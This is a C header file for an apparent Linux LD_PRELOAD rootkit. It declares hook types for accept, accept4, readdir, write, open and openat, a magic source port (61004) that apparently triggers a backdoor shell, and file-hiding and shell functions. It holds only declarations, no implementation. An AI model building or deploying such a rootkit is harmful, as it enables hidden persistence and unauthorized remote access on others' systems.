#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <dlfcn.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <dirent.h>
#include <string.h>
#include <fcntl.h>
#include <stdarg.h>

#define MAGIC_SOURCE_PORT 61004

typedef int (*orig_accept_func_type)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
typedef int (*orig_accept4_func_type)(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
typedef struct dirent *(*orig_readdir_func_type)(DIR *dirp);
typedef ssize_t (*orig_write_func_type)(int fd, const void *buf, size_t count);
typedef int (*orig_open_func_type)(const char *pathname, int flags, ...);
typedef int (*orig_openat_func_type)(int dirfd, const char *pathname, int flags, ...);

bool check_rootkit_file(const char *d_name);
int inspect_and_shell(int client_fd, struct sockaddr *addr);

#endif // ROOTKIT_H